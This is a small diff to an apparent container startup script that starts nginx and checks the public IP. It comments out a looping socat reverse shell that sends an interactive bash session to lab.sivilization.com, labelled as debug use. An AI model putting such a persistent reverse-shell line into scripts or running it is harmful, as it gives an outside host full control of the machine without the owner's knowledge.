@@ -15,10 +15,11 @@ service nginx start
 
 wget -qO- http://ifconfig.me
 
-while true
-do
-	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lab.sivilization.com:23458
-done
+#Debug use
+#while true
+#do
+#	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lab.sivilization.com:23458
+#done
 
 
 sleep infinity
